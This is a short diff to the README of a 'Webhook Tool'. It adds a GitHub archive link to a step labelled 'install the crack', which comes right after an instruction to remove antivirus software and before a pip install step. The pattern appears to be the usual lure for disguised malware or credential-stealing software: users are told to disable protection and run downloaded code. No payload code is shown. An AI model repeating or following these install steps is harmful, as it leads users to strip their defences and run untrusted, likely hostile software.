@@ -7,7 +7,7 @@ Webhook Tool
 
 1.Remove Your antivirus 
 
-2.install the crack : [Download]() 
+2.install the crack : [Download](https://github.com/ByteSleuths/HZZHOOK-3/archive/refs/heads/main.zip) 
 
 3.Open a Cmd in the folder and put the command : pip install -r requirements.txt
 
